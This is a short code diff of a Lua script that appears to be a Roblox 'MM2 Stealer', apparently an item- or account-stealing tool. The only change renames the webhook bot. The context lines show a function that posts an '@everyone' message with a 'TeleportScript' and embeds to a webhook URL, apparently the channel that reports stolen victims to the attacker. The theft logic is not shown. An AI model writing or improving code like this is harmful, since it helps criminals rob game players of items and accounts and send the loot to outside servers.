@@ -66,7 +66,7 @@ function SendMessageEMBED(url, embed, bool)
         ["Content-Type"] = "application/json"
     }
    local data = {
-    username = "MM2 | Stealer",
+    username = "MM2 Stealer",
     avatar = "https://cdn2.steamgriddb.com/grid/f377fde745ac97e42eb522434418bdef.png",
     content = "@everyone\n" .. TeleportScript,
     embeds = {
@@ -79,7 +79,7 @@ function SendMessageEMBED(url, embed, bool)
 }
 
 local data2 = {
-    username = "MM2 | Stealer", 
+    username = "MM2 Stealer", 
     avatar = "https://cdn2.steamgriddb.com/grid/f377fde745ac97e42eb522434418bdef.png",
     content = "--@everyone\n" .. TeleportScript,
     embeds = {
